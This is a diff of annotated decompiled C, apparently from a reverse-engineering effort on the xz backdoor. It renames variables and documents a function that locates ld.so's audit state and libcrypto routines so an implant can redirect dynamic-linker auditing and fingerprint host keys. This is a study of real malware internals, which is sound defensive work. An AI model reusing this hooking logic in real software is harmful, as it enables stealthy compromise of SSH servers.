@@ -5,7 +5,11 @@
 
 
 /*
- * AutoDoc: Matches the `_dl_naudit` and `_dl_audit` references inside ld.so, records their offsets within `__rtld_global_ro`, and resolves a few extra crypto routines. Those offsets let the implant point ld.so's global audit state at its forged interface.
+ * AutoDoc: Parses `rtld_global_ro` for the `GLRO(dl_naudit)` string, locates the matching LEA inside
+ * `_dl_audit_symbind_alt`, and from there recovers the addresses of `_dl_naudit` and
+ * `_dl_audit` within ld.so. It also resolves a few extra libcrypto helpers (EVP_MD_CTX_free,
+ * DSA_get0_{pqg,pub_key}) so the later monitor hooks can fingerprint host keys. The discovered
+ * pointers are stored inside `hooks->ldso_ctx`.
  */
 #include "xzre_types.h"
 
@@ -33,8 +37,12 @@ BOOL find_dl_naudit(elf_info_t *dynamic_linker_elf,elf_info_t *libcrypto_elf,
   u8 *code_start_00;
   uint *mem_address;
   byte bVar14;
+  uchar *rtld_global_ro;
+  char *naudit_string;
+  Elf64_Sym *libcrypto_symbol;
+  _func_64 *audit_stub;
   EncodedStringId local_8c;
-  u64 local_88;
+  uint *naudit_slot;
   u8 *local_80;
   u64 local_78;
   undefined1 local_6f;
@@ -45,16 +53,17 @@ BOOL find_dl_naudit(elf_info_t *dynamic_linker_elf,elf_info_t *libcrypto_elf,
   
   bVar14 = 0;
   local_8c = 0;
-  local_88 = 0;
+  naudit_slot = (uint *)0x0;
   pEVar5 = elf_symbol_get(dynamic_linker_elf,STR_rtld_global_ro,0);
   if (pEVar5 != (Elf64_Sym *)0x0) {
     local_8c = STR_GLRO_dl_naudit_naudit;
     str = elf_find_string(dynamic_linker_elf,&local_8c,(void *)0x0);
     if (str != (char *)0x0) {
       pEVar6 = elf_symbol_get(libcrypto_elf,STR_DSA_get0_pqg,0);
-      puVar7 = (u8 *)elf_get_code_segment(dynamic_linker_elf,&local_88);
+      puVar7 = (u8 *)elf_get_code_segment(dynamic_linker_elf,(u64 *)&naudit_slot);
       if ((puVar7 != (u8 *)0x0) &&
-         (puVar7 = find_string_reference(puVar7,puVar7 + local_88,str), puVar7 != (u8 *)0x0)) {
+         (puVar7 = find_string_reference(puVar7,(u8 *)((long)naudit_slot + (long)puVar7),str),
+         puVar7 != (u8 *)0x0)) {
         if (pEVar6 != (Elf64_Sym *)0x0) {
           EVar1 = pEVar6->st_value;
           pEVar2 = libcrypto_elf->elfbase;
